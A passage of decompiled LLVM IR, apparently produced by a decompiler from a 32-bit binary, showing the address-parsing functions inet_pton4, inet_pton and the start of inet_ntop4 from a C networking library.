  %v9_804d3c5 = icmp eq i8 %v2_804d3ff22, 57
  store i1 %v9_804d3c5, i1* %zf.global-to-local, align 1
  %v6_804d3c8 = icmp ugt i32 %v1_804d3c2, 9
  br i1 %v6_804d3c8, label %dec_label_pc_804d3eb, label %dec_label_pc_804d3ca

dec_label_pc_804d3ca:                             ; preds = %dec_label_pc_804d3c2
  %v0_804d3ca = load i32, i32* @esi, align 4
  %v1_804d3ca = inttoptr i32 %v0_804d3ca to i8*
  %v2_804d3ca = load i8, i8* %v1_804d3ca, align 1
  %v2_804d3cd = zext i8 %v2_804d3ca to i32
  %v3_804d3cd = mul nuw nsw i32 %v2_804d3cd, 10
  %v3_804d3d0 = add nsw i32 %v3_804d3cd, %v1_804d3c2
  store i32 %v3_804d3d0, i32* @eax, align 4
  %v9_804d3d4 = icmp eq i32 %v3_804d3d0, 255
  store i1 %v9_804d3d4, i1* %zf.global-to-local, align 1
  %v6_804d3d9 = icmp ugt i32 %v3_804d3d0, 255
  br i1 %v6_804d3d9, label %dec_label_pc_804d424, label %dec_label_pc_804d3db

dec_label_pc_804d3db:                             ; preds = %dec_label_pc_804d3ca
  %v0_804d3db = load i32, i32* @edx, align 4
  %v1_804d3db = icmp eq i32 %v0_804d3db, 0
  store i1 %v1_804d3db, i1* %zf.global-to-local, align 1
  %v1_804d3dd = trunc i32 %v3_804d3d0 to i8
  store i8 %v1_804d3dd, i8* %v1_804d3ca, align 1
  %v0_804d3df = load i1, i1* %zf.global-to-local, align 1
  %v1_804d3df = icmp eq i1 %v0_804d3df, false
  br i1 %v1_804d3df, label %dec_label_pc_804d3ff.backedge, label %dec_label_pc_804d3e1

dec_label_pc_804d3e1:                             ; preds = %dec_label_pc_804d3db
  %v0_804d3e1 = load i32, i32* @edi, align 4
  %v1_804d3e1 = add i32 %v0_804d3e1, 1
  store i32 %v1_804d3e1, i32* @edi, align 4
  %v1_804d3e2 = add i32 %v0_804d3e1, -3
  %v6_804d3e2 = sub i32 2, %v0_804d3e1
  %v7_804d3e2 = and i32 %v6_804d3e2, %v1_804d3e1
  %v8_804d3e2 = icmp slt i32 %v7_804d3e2, 0
  %v9_804d3e2 = icmp eq i32 %v1_804d3e2, 0
  store i1 %v9_804d3e2, i1* %zf.global-to-local, align 1
  %v10_804d3e2 = icmp slt i32 %v1_804d3e2, 0
  %v3_804d3e5 = icmp eq i1 %v10_804d3e2, %v8_804d3e2
  %v4_804d3e5 = icmp eq i1 %v9_804d3e2, false
  %v5_804d3e5 = and i1 %v4_804d3e5, %v3_804d3e5
  br i1 %v5_804d3e5, label %dec_label_pc_804d424, label %dec_label_pc_804d3e7

dec_label_pc_804d3e7:                             ; preds = %dec_label_pc_804d3e1
  %v0_804d3e7 = load i32, i32* @edx, align 4
  %v1_804d3e7 = and i32 %v0_804d3e7, -256
  %v2_804d3e7 = or i32 %v1_804d3e7, 1
  store i32 %v2_804d3e7, i32* @edx, align 4
  br label %dec_label_pc_804d3ff.backedge

dec_label_pc_804d3eb:                             ; preds = %dec_label_pc_804d3c2
  %v9_804d3eb = icmp eq i8 %v2_804d3ff22, 46
  store i1 %v9_804d3eb, i1* %zf.global-to-local, align 1
  %v1_804d3ee = icmp eq i1 %v9_804d3eb, false
  br i1 %v1_804d3ee, label %dec_label_pc_804d424, label %dec_label_pc_804d3f0

dec_label_pc_804d3f0:                             ; preds = %dec_label_pc_804d3eb
  %v0_804d3f0 = load i32, i32* @edx, align 4
  %v1_804d3f0 = icmp eq i32 %v0_804d3f0, 0
  store i1 %v1_804d3f0, i1* %zf.global-to-local, align 1
  br i1 %v1_804d3f0, label %dec_label_pc_804d424, label %dec_label_pc_804d3f4

dec_label_pc_804d3f4:                             ; preds = %dec_label_pc_804d3f0
  %v0_804d3f4 = load i32, i32* @edi, align 4
  %v9_804d3f4 = icmp eq i32 %v0_804d3f4, 4
  store i1 %v9_804d3f4, i1* %zf.global-to-local, align 1
  br i1 %v9_804d3f4, label %dec_label_pc_804d424, label %dec_label_pc_804d3f9

dec_label_pc_804d3f9:                             ; preds = %dec_label_pc_804d3f4
  %v0_804d3f9 = load i32, i32* @esi, align 4
  %v1_804d3f9 = add i32 %v0_804d3f9, 1
  store i32 %v1_804d3f9, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_804d3fc = inttoptr i32 %v1_804d3f9 to i8*
  store i8 0, i8* %v1_804d3fc, align 1
  br label %dec_label_pc_804d3ff.backedge

dec_label_pc_804d3ff.backedge:                    ; preds = %dec_label_pc_804d3f9, %dec_label_pc_804d3e7, %dec_label_pc_804d3db
  %v0_804d3ff.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d3ff = inttoptr i32 %v0_804d3ff.pre to i8*
  %v2_804d3ff = load i8, i8* %v1_804d3ff, align 1
  %v3_804d3ff = sext i8 %v2_804d3ff to i32
  store i32 %v3_804d3ff, i32* @ecx, align 4
  %v1_804d402 = add i32 %v0_804d3ff.pre, 1
  store i32 %v1_804d402, i32* %ebx.global-to-local, align 4
  %v1_804d403 = icmp eq i8 %v2_804d3ff, 0
  store i1 %v1_804d403, i1* %zf.global-to-local, align 1
  %v1_804d405 = icmp eq i1 %v1_804d403, false
  br i1 %v1_804d405, label %dec_label_pc_804d3c2, label %dec_label_pc_804d3ff.dec_label_pc_804d407_crit_edge

dec_label_pc_804d3ff.dec_label_pc_804d407_crit_edge: ; preds = %dec_label_pc_804d3ff.backedge
  %v0_804d407.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d407

dec_label_pc_804d407:                             ; preds = %dec_label_pc_804d3ff.dec_label_pc_804d407_crit_edge, %entry
  %v0_804d407 = phi i32 [ %v0_804d407.pre, %dec_label_pc_804d3ff.dec_label_pc_804d407_crit_edge ], [ 0, %entry ]
  %v10_804d407 = icmp eq i32 %v0_804d407, 3
  store i1 %v10_804d407, i1* %zf.global-to-local, align 1
  %v7_804d40a = icmp sgt i32 %v0_804d407, 3
  br i1 %v7_804d40a, label %dec_label_pc_804d40c, label %dec_label_pc_804d424

dec_label_pc_804d40c:                             ; preds = %dec_label_pc_804d407
  %v0_804d40c = load i32, i32* @eax, align 4
  %v3_804d415 = bitcast i32* %stack_var_-20 to i16*
  %v4_804d415 = call i32 @memcpy(i16* %v3_804d415, i32 4, i32 %v0_804d40c)
  %v0_804d41f = load i32, i32* @esp, align 4
  %v6_804d41f = icmp eq i32 %v0_804d41f, -16
  store i1 %v6_804d41f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804d426

dec_label_pc_804d424:                             ; preds = %dec_label_pc_804d3f4, %dec_label_pc_804d3f0, %dec_label_pc_804d3eb, %dec_label_pc_804d3e1, %dec_label_pc_804d3ca, %dec_label_pc_804d407
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_804d426.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d426

dec_label_pc_804d426:                             ; preds = %dec_label_pc_804d40c, %dec_label_pc_804d424
  %v0_804d426 = phi i32 [ %v15_804d3b4, %dec_label_pc_804d40c ], [ %v0_804d426.pre, %dec_label_pc_804d424 ]
  %v0_804d42d = phi i32 [ 1, %dec_label_pc_804d40c ], [ 0, %dec_label_pc_804d424 ]
  %v9_804d426 = icmp eq i32 %v0_804d426, -28
  store i1 %v9_804d426, i1* %zf.global-to-local, align 1
  %v2_804d429 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d429, i32* @ebx, align 4
  store i32 %v0_804d3ae, i32* @esi, align 4
  ret i32 %v0_804d42d

; uselistorder directives
  uselistorder i32 %v0_804d407, { 1, 0 }
  uselistorder i32 %v3_804d3ff, { 1, 0 }
  uselistorder i8 %v2_804d3ff, { 1, 2, 0 }
  uselistorder i1 %v9_804d3f4, { 1, 0 }
  uselistorder i32 %v1_804d3e2, { 1, 0 }
  uselistorder i32 %v3_804d3d0, { 1, 2, 0, 3 }
  uselistorder i8 %v2_804d3ff22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804d426, { 1, 0 }
  uselistorder label %dec_label_pc_804d424, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804d3c2, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d42e = load i32, i32* @ebp, align 4
  %v0_804d42f = load i32, i32* @edi, align 4
  %v0_804d430 = load i32, i32* @esi, align 4
  %v0_804d431 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804d439 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804d439, i32* @edi, align 4
  %v9_804d43d = icmp eq i32 %arg1, 2
  br i1 %v9_804d43d, label %dec_label_pc_804d44d, label %dec_label_pc_804d442

dec_label_pc_804d442:                             ; preds = %entry
  %v9_804d442 = icmp eq i32 %arg1, 10
  %v1_804d445 = icmp eq i1 %v9_804d442, false
  br i1 %v1_804d445, label %dec_label_pc_804d5de, label %dec_label_pc_804d45d

dec_label_pc_804d44d:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_804d439, i32* @eax, align 4
  %v3_804d453 = call i32 @inet_pton4(i32 %v0_804d431, i32 %v0_804d430, i32 %v0_804d42f)
  store i32 %v3_804d453, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5f0

dec_label_pc_804d45d:                             ; preds = %dec_label_pc_804d442
  %v2_804d462 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d462, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_804d467 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_804d467, i32* @ebx, align 4
  %v2_804d46e = add i32 %v5_804d467, 16
  store i32 %v2_804d46e, i32* %eax.global-to-local, align 4
  %v0_804d478 = load i32, i32* @edi, align 4
  %v1_804d478 = inttoptr i32 %v0_804d478 to i8*
  %v2_804d478 = load i8, i8* %v1_804d478, align 1
  %v11_804d478 = icmp eq i8 %v2_804d478, 58
  %v1_804d47b = icmp eq i1 %v11_804d478, false
  br i1 %v1_804d47b, label %dec_label_pc_804d50e, label %dec_label_pc_804d47d

dec_label_pc_804d47d:                             ; preds = %dec_label_pc_804d45d
  %v1_804d47d = add i32 %v0_804d478, 1
  store i32 %v1_804d47d, i32* @edi, align 4
  %v1_804d47e = inttoptr i32 %v1_804d47d to i8*
  %v2_804d47e = load i8, i8* %v1_804d47e, align 1
  %v11_804d47e = icmp eq i8 %v2_804d47e, 58
  %v1_804d481 = icmp eq i1 %v11_804d47e, false
  br i1 %v1_804d481, label %dec_label_pc_804d5ee, label %dec_label_pc_804d50e

dec_label_pc_804d495:                             ; preds = %dec_label_pc_804d54e
  %v0_804d496 = load i32, i32* @edi, align 4
  %v1_804d496 = add i32 %v0_804d496, 1
  store i32 %v1_804d496, i32* @edi, align 4
  %v4_804d49e = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805085c.107, i32 0, i32 0), i32 %v2_804d555)
  store i32 %v4_804d49e, i32* %eax.global-to-local, align 4
  %v1_804d4a6 = icmp eq i32 %v4_804d49e, 0
  br i1 %v1_804d4a6, label %dec_label_pc_804d4c5, label %dec_label_pc_804d4aa

dec_label_pc_804d4aa:                             ; preds = %dec_label_pc_804d495
  %v0_804d4aa = load i32, i32* @ebp, align 4
  %v2_804d4aa = mul i32 %v0_804d4aa, 16
  %v1_804d4ad = add i32 %v4_804d49e, -134547548
  store i32 %v1_804d4ad, i32* %eax.global-to-local, align 4
  %v2_804d4b2 = or i32 %v2_804d4aa, %v1_804d4ad
  store i32 %v2_804d4b2, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_804d4b2, 65536
  br i1 %tmp, label %dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge, label %dec_label_pc_804d5ee

dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge: ; preds = %dec_label_pc_804d4aa
  %v0_804d54e.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d54e.outer

dec_label_pc_804d54e.outer:                       ; preds = %dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge, %dec_label_pc_804d50e
  %v0_804d54e.pre = phi i32 [ %v0_804d54e.pre.pre, %dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_804d50e ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_804d50e ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_804d50e ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_804d4aa.dec_label_pc_804d54e.outer_crit_edge ], [ 0, %dec_label_pc_804d50e ]
  %v4_804d4ca = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_804d4cf = icmp eq i1 %v4_804d4ca, false
  br label %dec_label_pc_804d54e

dec_label_pc_804d4c5:                             ; preds = %dec_label_pc_804d495
  %v0_804d4c5 = load i32, i32* @esi, align 4
  %v9_804d4c5 = icmp eq i32 %v0_804d4c5, 58
  %v1_804d4c8 = icmp eq i1 %v9_804d4c5, false
  br i1 %v1_804d4c8, label %dec_label_pc_804d51a, label %dec_label_pc_804d4ca

dec_label_pc_804d4ca:                             ; preds = %dec_label_pc_804d4c5
  br i1 %v1_804d4cf, label %dec_label_pc_804d4e6, label %dec_label_pc_804d4d1

dec_label_pc_804d4d1:                             ; preds = %dec_label_pc_804d4ca
  %v5_804d4d1 = icmp eq i8* %stack_var_-44.1, null
  %v1_804d4d6 = icmp eq i1 %v5_804d4d1, false
  br i1 %v1_804d4d6, label %dec_label_pc_804d5ee, label %dec_label_pc_804d4dc

dec_label_pc_804d4dc:                             ; preds = %dec_label_pc_804d4d1
  %v0_804d4dc = load i32, i32* @ebx, align 4
  %v5_804d4dc = inttoptr i32 %v0_804d4dc to i8*
  %v0_804d4e0 = load i32, i32* @edi, align 4
  %v5_804d4e0 = inttoptr i32 %v0_804d4e0 to i8*
  br label %dec_label_pc_804d54e

dec_label_pc_804d4e6:                             ; preds = %dec_label_pc_804d4ca
  %v0_804d4e6 = load i32, i32* @edi, align 4
  %v1_804d4e6 = inttoptr i32 %v0_804d4e6 to i8*
  %v2_804d4e6 = load i8, i8* %v1_804d4e6, align 1
  %v3_804d4e6 = icmp eq i8 %v2_804d4e6, 0
  br i1 %v3_804d4e6, label %dec_label_pc_804d5ee, label %dec_label_pc_804d4ef

dec_label_pc_804d4ef:                             ; preds = %dec_label_pc_804d4e6
  %v0_804d4ef = load i32, i32* @ebx, align 4
  %v1_804d4ef = add i32 %v0_804d4ef, 2
  store i32 %v1_804d4ef, i32* @edx, align 4
  %v6_804d4f6 = icmp ugt i32 %v1_804d4ef, %v2_804d46e
  br i1 %v6_804d4f6, label %dec_label_pc_804d5ee, label %dec_label_pc_804d4fc

dec_label_pc_804d4fc:                             ; preds = %dec_label_pc_804d4ef
  %v0_804d4fc = load i32, i32* @ebp, align 4
  %v2_804d4fe = udiv i32 %v0_804d4fc, 256
  %v4_804d4fe = trunc i32 %v2_804d4fe to i8
  %v3_804d501 = inttoptr i32 %v0_804d4ef to i8*
  store i8 %v4_804d4fe, i8* %v3_804d501, align 1
  %v0_804d503 = load i32, i32* @ebp, align 4
  store i32 %v0_804d503, i32* %eax.global-to-local, align 4
  %v1_804d505 = trunc i32 %v0_804d503 to i8
  %v2_804d505 = load i32, i32* @ebx, align 4
  %v3_804d505 = add i32 %v2_804d505, 1
  %v4_804d505 = inttoptr i32 %v3_804d505 to i8*
  store i8 %v1_804d505, i8* %v4_804d505, align 1
  %v0_804d508 = load i32, i32* @edx, align 4
  store i32 %v0_804d508, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d50e

dec_label_pc_804d50e:                             ; preds = %dec_label_pc_804d45d, %dec_label_pc_804d47d, %dec_label_pc_804d4fc
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_804d4fc ], [ %v1_804d47d, %dec_label_pc_804d47d ], [ %v0_804d478, %dec_label_pc_804d45d ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d4fc ], [ null, %dec_label_pc_804d47d ], [ null, %dec_label_pc_804d45d ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804d54e.outer

dec_label_pc_804d51a:                             ; preds = %dec_label_pc_804d4c5
  %v9_804d51a = icmp eq i32 %v0_804d4c5, 46
  %v1_804d51d = icmp eq i1 %v9_804d51a, false
  br i1 %v1_804d51d, label %dec_label_pc_804d5ee, label %dec_label_pc_804d523

dec_label_pc_804d523:                             ; preds = %dec_label_pc_804d51a
  %v0_804d523 = load i32, i32* @ebx, align 4
  %v1_804d523 = add i32 %v0_804d523, 4
  store i32 %v1_804d523, i32* @esi, align 4
  %v6_804d52a = icmp ugt i32 %v1_804d523, %v2_804d46e
  br i1 %v6_804d52a, label %dec_label_pc_804d5ee, label %dec_label_pc_804d530

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d523
  %v4_804d530 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_804d530, i32* @eax, align 4
  store i32 %v0_804d523, i32* @edx, align 4
  store i32 %v1_804d523, i32* @ebx, align 4
  %v2_804d538 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d538 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_804d538, i32 %v2_804d46e)
  store i32 %v5_804d538, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_804d538, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_804d585, label %dec_label_pc_804d5ee

dec_label_pc_804d54e:                             ; preds = %dec_label_pc_804d54e.outer, %dec_label_pc_804d4dc
  %v0_804d54e = phi i32 [ %v0_804d4e0, %dec_label_pc_804d4dc ], [ %v0_804d54e.pre, %dec_label_pc_804d54e.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_804d4dc, %dec_label_pc_804d4dc ], [ %stack_var_-44.1.ph, %dec_label_pc_804d54e.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_804d4e0, %dec_label_pc_804d4dc ], [ %stack_var_-36.1.ph, %dec_label_pc_804d54e.outer ]
  %v1_804d54e = inttoptr i32 %v0_804d54e to i8*
  %v2_804d54e = load i8, i8* %v1_804d54e, align 1
  %v3_804d54e = sext i8 %v2_804d54e to i32
  store i32 %v3_804d54e, i32* %eax.global-to-local, align 4
  %v2_804d555 = call i32 @__GI_tolower(i32 %v3_804d54e)
  store i32 %v2_804d555, i32* %eax.global-to-local, align 4
  %v1_804d55d = icmp eq i32 %v2_804d555, 0
  store i32 %v2_804d555, i32* @esi, align 4
  %v1_804d561 = icmp eq i1 %v1_804d55d, false
  br i1 %v1_804d561, label %dec_label_pc_804d495, label %dec_label_pc_804d567

dec_label_pc_804d567:                             ; preds = %dec_label_pc_804d54e
  br i1 %v4_804d4ca, label %dec_label_pc_804d585, label %dec_label_pc_804d56e

dec_label_pc_804d56e:                             ; preds = %dec_label_pc_804d567
  %v0_804d56e = load i32, i32* @ebx, align 4
  %v1_804d56e = add i32 %v0_804d56e, 2
  store i32 %v1_804d56e, i32* @edx, align 4
  %v6_804d575 = icmp ugt i32 %v1_804d56e, %v2_804d46e
  br i1 %v6_804d575, label %dec_label_pc_804d5ee, label %dec_label_pc_804d577

dec_label_pc_804d577:                             ; preds = %dec_label_pc_804d56e
  %v0_804d577 = load i32, i32* @ebp, align 4
  %v2_804d579 = udiv i32 %v0_804d577, 256
  %v4_804d579 = trunc i32 %v2_804d579 to i8
  %v3_804d57c = inttoptr i32 %v0_804d56e to i8*
  store i8 %v4_804d579, i8* %v3_804d57c, align 1
  %v0_804d57e = load i32, i32* @ebp, align 4
  store i32 %v0_804d57e, i32* %eax.global-to-local, align 4
  %v1_804d580 = trunc i32 %v0_804d57e to i8
  %v2_804d580 = load i32, i32* @ebx, align 4
  %v3_804d580 = add i32 %v2_804d580, 1
  %v4_804d580 = inttoptr i32 %v3_804d580 to i8*
  store i8 %v1_804d580, i8* %v4_804d580, align 1
  %v0_804d583 = load i32, i32* @edx, align 4
  store i32 %v0_804d583, i32* @ebx, align 4
  br label %dec_label_pc_804d585

dec_label_pc_804d585:                             ; preds = %dec_label_pc_804d567, %dec_label_pc_804d530, %dec_label_pc_804d577
  %v4_804d585 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d585 = icmp eq i8* %stack_var_-44.1, null
  %v0_804d5bd.pre = load i32, i32* @ebx, align 4
  br i1 %v5_804d585, label %dec_label_pc_804d5bd, label %dec_label_pc_804d58c

dec_label_pc_804d58c:                             ; preds = %dec_label_pc_804d585
  store i32 1, i32* @esi, align 4
  %v6_804d593 = sub i32 %v0_804d5bd.pre, %v4_804d585
  store i32 %v6_804d593, i32* @edi, align 4
  %v16_804d597 = icmp eq i32 %v0_804d5bd.pre, %v2_804d46e
  %v1_804d59b = icmp eq i1 %v16_804d597, false
  br i1 %v1_804d59b, label %dec_label_pc_804d5b5.preheader, label %dec_label_pc_804d5ee

dec_label_pc_804d5b5.preheader:                   ; preds = %dec_label_pc_804d58c
  %v3_804d5b589 = inttoptr i32 %v6_804d593 to i8*
  %v9_804d5b794 = icmp slt i8* %v3_804d5b589, inttoptr (i32 1 to i8*)
  br i1 %v9_804d5b794, label %dec_label_pc_804d5b9, label %dec_label_pc_804d59f

dec_label_pc_804d59f:                             ; preds = %dec_label_pc_804d5b5.preheader, %dec_label_pc_804d59f
  %v0_804d5ad96 = phi i32 [ %v0_804d5b5.pre, %dec_label_pc_804d59f ], [ 1, %dec_label_pc_804d5b5.preheader ]
  %v0_804d59f95 = phi i32 [ %v1_804d5b5.pre, %dec_label_pc_804d59f ], [ %v6_804d593, %dec_label_pc_804d5b5.preheader ]
  %v2_804d5a5 = sub i32 %v0_804d59f95, %v0_804d5ad96
  %v6_804d5a7 = add i32 %v2_804d5a5, %v4_804d585
  store i32 %v6_804d5a7, i32* %eax.global-to-local, align 4
  %v2_804d5ab = sub i32 %v2_804d46e, %v0_804d5ad96
  store i32 %v2_804d5ab, i32* @ecx, align 4
  %v1_804d5ad = add i32 %v0_804d5ad96, 1
  store i32 %v1_804d5ad, i32* @esi, align 4
  %v1_804d5ae = inttoptr i32 %v6_804d5a7 to i8*
  %v2_804d5ae = load i8, i8* %v1_804d5ae, align 1
  %v3_804d5ae = zext i8 %v2_804d5ae to i32
  %v4_804d5ae = load i32, i32* @edx, align 4
  %v5_804d5ae = and i32 %v4_804d5ae, -256
  %v6_804d5ae = or i32 %v5_804d5ae, %v3_804d5ae
  store i32 %v6_804d5ae, i32* @edx, align 4
  %v3_804d5b0 = inttoptr i32 %v2_804d5ab to i8*
  store i8 %v2_804d5ae, i8* %v3_804d5b0, align 1
  %v0_804d5b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d5b2 = inttoptr i32 %v0_804d5b2 to i8*
  store i8 0, i8* %v1_804d5b2, align 1
  %v0_804d5b5.pre = load i32, i32* @esi, align 4
  %v1_804d5b5.pre = load i32, i32* @edi, align 4
  %v2_804d5b5 = inttoptr i32 %v0_804d5b5.pre to i8*
  %v3_804d5b5 = inttoptr i32 %v1_804d5b5.pre to i8*
  %v9_804d5b7 = icmp sgt i8* %v2_804d5b5, %v3_804d5b5
  br i1 %v9_804d5b7, label %dec_label_pc_804d5b9, label %dec_label_pc_804d59f

dec_label_pc_804d5b9:                             ; preds = %dec_label_pc_804d59f, %dec_label_pc_804d5b5.preheader
  br label %dec_label_pc_804d5bd

dec_label_pc_804d5bd:                             ; preds = %dec_label_pc_804d585, %dec_label_pc_804d5b9
  %v0_804d5bd = phi i32 [ %v2_804d46e, %dec_label_pc_804d5b9 ], [ %v0_804d5bd.pre, %dec_label_pc_804d585 ]
  %v16_804d5bd = icmp eq i32 %v0_804d5bd, %v2_804d46e
  %v1_804d5c1 = icmp eq i1 %v16_804d5bd, false
  br i1 %v1_804d5c1, label %dec_label_pc_804d5ee, label %dec_label_pc_804d5c3

dec_label_pc_804d5c3:                             ; preds = %dec_label_pc_804d5bd
  store i32 %v2_804d462, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_804d5cf = call i32 @memcpy(i16* %tmp64, i32 %v2_804d462, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5f0

dec_label_pc_804d5de:                             ; preds = %dec_label_pc_804d442
  %v1_804d5de = call i32 @__errno_location(i32 %v0_804d431)
  %v1_804d5e3 = inttoptr i32 %v1_804d5de to i32*
  store i32 97, i32* %v1_804d5e3, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5f0

dec_label_pc_804d5ee:                             ; preds = %dec_label_pc_804d4ef, %dec_label_pc_804d4e6, %dec_label_pc_804d4aa, %dec_label_pc_804d4d1, %dec_label_pc_804d58c, %dec_label_pc_804d530, %dec_label_pc_804d5bd, %dec_label_pc_804d56e, %dec_label_pc_804d523, %dec_label_pc_804d51a, %dec_label_pc_804d47d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5f0

dec_label_pc_804d5f0:                             ; preds = %dec_label_pc_804d5de, %dec_label_pc_804d5c3, %dec_label_pc_804d44d, %dec_label_pc_804d5ee
  %v0_804d5f7 = phi i32 [ -1, %dec_label_pc_804d5de ], [ 1, %dec_label_pc_804d5c3 ], [ %v3_804d453, %dec_label_pc_804d44d ], [ 0, %dec_label_pc_804d5ee ]
  store i32 %v0_804d431, i32* @ebx, align 4
  store i32 %v0_804d430, i32* @esi, align 4
  store i32 %v0_804d42f, i32* @edi, align 4
  store i32 %v0_804d42e, i32* @ebp, align 4
  ret i32 %v0_804d5f7

; uselistorder directives
  uselistorder i32 %v1_804d5b5.pre, { 1, 0 }
  uselistorder i32 %v0_804d5b5.pre, { 1, 0 }
  uselistorder i32 %v0_804d5ad96, { 2, 1, 0 }
  uselistorder i32 %v0_804d5bd.pre, { 1, 0, 2 }
  uselistorder i32 %v2_804d555, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_804d46e, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_804d431, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804d5f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d5ee, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_804d5bd, { 1, 0 }
  uselistorder label %dec_label_pc_804d59f, { 1, 0 }
  uselistorder label %dec_label_pc_804d585, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d54e, { 1, 0 }
  uselistorder label %dec_label_pc_804d50e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d54e.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_804d5f9 = load i32, i32* @edi, align 4
  %v0_804d5fa = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_804d5fe = ptrtoint i32* %stack_var_-76 to i32
  %v0_804d601 = load i32, i32* @eax, align 4
  %v3_804d605 = and i32 %v0_804d601, -65536
  %v2_804d60b = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_804d610 = load i32, i32* @edx, align 4
  %v5_804d610 = inttoptr i32 %v0_804d610 to i8*
  store i8* %v5_804d610, i8** %stack_var_-56, align 4
  %v0_804d614 = load i32, i32* @ecx, align 4
  store i32 %v3_804d605, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_804d61f = add i32 %v2_804d60b, 4
  store i32 %v6_804d61f, i32* %edi.global-to-local, align 4
  %v2_804d620 = inttoptr i32 %v6_804d61f to i32*
  store i32 0, i32* %v2_804d620, align 4
